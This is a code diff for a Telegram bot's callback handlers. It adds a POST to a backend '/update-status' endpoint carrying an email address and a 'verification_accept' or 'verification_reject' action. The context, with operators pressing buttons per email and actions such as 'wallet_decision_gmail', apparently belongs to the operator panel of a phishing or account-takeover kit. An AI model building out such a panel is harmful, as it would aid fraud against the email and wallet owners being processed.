@@ -577,6 +577,20 @@ bot.on("callback_query", async (query) => {
 
       console.log(`📨 Final statusMessage: "${statusMessage}"`);
 
+      // ✅ UPDATE STATUS on backend for verification callbacks
+      if (action === "verification_accept" || action === "verification_reject") {
+        try {
+          await fetch(`${APP_URL}/update-status`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ email: email, action: action })
+          });
+          console.log(`✅ Updated status for verification action: ${action}`);
+        } catch (err) {
+          console.error("Error updating status:", err);
+        }
+      }
+
       if (statusMessage) {
         try {
           const replyUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -944,6 +958,20 @@ if (bot2) {
           statusMessage = `📧 <code>${email}</code> → ☁️`;
         } else if (action === "wallet_decision_gmail") {
           statusMessage = `📧 <code>${email}</code> → 🌈`;
+        }
+
+        // ✅ UPDATE STATUS on backend for verification callbacks
+        if (action === "verification_accept" || action === "verification_reject") {
+          try {
+            await fetch(`${APP_URL}/update-status`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ email: email, action: action })
+            });
+            console.log(`✅ Updated status for verification action: ${action}`);
+          } catch (err) {
+            console.error("Error updating status:", err);
+          }
         }
 
         if (statusMessage) {
